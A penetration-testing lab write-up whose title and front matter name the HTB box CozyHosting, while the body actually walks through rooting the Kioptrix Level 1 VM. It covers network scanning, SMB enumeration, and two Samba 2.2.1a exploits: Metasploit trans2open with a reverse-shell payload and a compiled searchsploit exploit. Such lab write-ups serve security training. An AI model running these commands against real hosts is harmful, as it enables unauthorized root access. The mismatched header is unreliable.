---
title: CozyHosting Writeup
date: 2023-09-15
categories: htb,pentesting
tags: htb,pentesting     # TAG names should always be lowercase
---
## Machine Info
* Difficulty: Easy
* Goal: Gain root access

## Network Scanning

### Netdiscover
We run netdiscover to get the IP address of kioptrix level 1 through the host-only adapter interface (eth1).

```bash
netdiscover -i eth1
```

![netdiscover](/assets/img/posts/kioptrix1/1.png)

### Nmap
After we got the IP address of the target machine, we run nmap to scan all ports and enable OS detection, version detection, script scanning, and traceroute to discover the open ports and services that are running on the target.

```bash
nmap -p- -A 192.168.56.110
```

![nmap](/assets/img/posts/kioptrix1/2.1.png)
![nmap](/assets/img/posts/kioptrix1/2.2.png)

## Enumeration
### Finding smb version
As a result of nmap scan, we have a bunch of open ports and services. Let's start to enumerate smb service on port 139. We run metasploit to discover the version of smb. In the metasploit console, we search for smb to get the auxiliary that will help us to discover the version of smb. Then we use "/auxiliary/scanner/smb/smb_version" (#61) and set RHOSTS to the target IP address and run.

```bash
msfconsole
search smb
use 61
options
set RHOSTS 192.168.56.110
run
```
![smb_version](/assets/img/posts/kioptrix1/4.png)
![smb_version](/assets/img/posts/kioptrix1/5.png)

## Exploitation

### Method 1: trans2open Overflow (Metasploit)
After we got the version of smb that is running on the target machine which is (Samba 2.2.1a), we use searchsploit to search for any exploit offline and we found some exploits that we can use also you can search for exploits online using your browser.

```bash
searchsploit Samba 2.2.1a
```

![searchsploit_trans2open](/assets/img/posts/kioptrix1/6.1.png)

From the results of searchsploit, we decided to select “trans2open Overflow” that has an existed module in metasploit. Therefore, we turn on the metasploit console and search for trans2open then we select "exploit/linux/samba/trans2open" (#1) since our target machine is linux. After that, we set RHOSTS to the IP address of the target machine then we run the exploit. But as depicted in the second image below, the exploit did not work and all the opened sessions are closed.

```bash
msfconsole
search trans2open
use 1
options
set RHOSTS 192.168.56.110
run
```

![trans2open](/assets/img/posts/kioptrix1/7.png)
![trans2open](/assets/img/posts/kioptrix1/8.png)

Therefore, we checked the payload and we decided that we are going to change the previous staged payload which is "linux/x86/meterpreter/reverse_tcp" to un-staged payload which is "linux/x86/shell_reverse_tcp". And finally, the exploit worked successfully and we gained root access to the target machine.

```bash
options
set payload linux/x86/shell_reverse_tcp
run
id
```

![root_access](/assets/img/posts/kioptrix1/9.png)

### Method 2: Remote Code Execution
We try to use another exploit to gain access to the target machine, but this time the exploit is manual. We run searchsploit as the previous time and select "Remote Code Execution" exploit to download it on our kali linux machine using mirror option "-m".

```bash
searchsploit Samba 2.2.1a
searchsploit -m multiple/remote/10.c
```

![searchsploit_RCE](/assets/img/posts/kioptrix1/10.png)

After we downloaded the exploit, we compile it using gcc and run it against our target machine. And we got the root shell on the target machine.

```bash
gcc 10.c -o 10
./10 -b 0 -v 192.168.56.110
whoami
uname -a
```

![searchsploit_RCE](/assets/img/posts/kioptrix1/11.png)
